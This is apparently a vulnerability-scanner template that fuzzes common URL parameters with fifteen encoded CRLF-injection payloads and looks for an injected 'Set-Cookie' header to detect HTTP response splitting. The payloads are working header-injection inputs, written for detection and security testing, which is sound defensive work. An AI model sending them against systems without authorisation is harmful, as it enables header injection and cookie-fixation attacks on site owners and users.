id: fuzz-param-crlf
name: CRLF Injection - Parameter Fuzzing
version: 1.0
author: Phantom Team
severity: medium
description: >
  Fuzzes common parameter names with CRLF injection payloads to detect
  HTTP response splitting vulnerabilities. Tests various encoding
  techniques for carriage return and line feed characters.

tags:
  - crlf
  - header-injection
  - fuzzing
  - parameter-discovery

requests:
  - method: GET
    path:
      - "/?q={{payload}}"
      - "/?url={{payload}}"
      - "/?redirect={{payload}}"
      - "/?next={{payload}}"
      - "/?path={{payload}}"
      - "/?page={{payload}}"
      - "/?return={{payload}}"
      - "/?dest={{payload}}"
      - "/?target={{payload}}"
      - "/?ref={{payload}}"
      - "/?lang={{payload}}"
      - "/?callback={{payload}}"

    attack: batteringram
    payloads:
      payload:
        - "%0aSet-Cookie:crlf=injection"
        - "%0d%0aSet-Cookie:crlf=injection"
        - "%0dSet-Cookie:crlf=injection"
        - "%23%0aSet-Cookie:crlf=injection"
        - "%23%0d%0aSet-Cookie:crlf=injection"
        - "%23%0dSet-Cookie:crlf=injection"
        - "%25%30%61Set-Cookie:crlf=injection"
        - "%25%30aSet-Cookie:crlf=injection"
        - "%250aSet-Cookie:crlf=injection"
        - "%25250aSet-Cookie:crlf=injection"
        - "%2e%2e%2f%0d%0aSet-Cookie:crlf=injection"
        - "%2f%2e%2e%0d%0aSet-Cookie:crlf=injection"
        - "%2F..%0d%0aSet-Cookie:crlf=injection"
        - "%3f%0d%0aSet-Cookie:crlf=injection"
        - "%3f%0dSet-Cookie:crlf=injection"

    matchers:
      - type: regex
        part: header
        regex:
          - "(?m)^Set-Cookie: crlf=injection"

stop-at-first-match: true
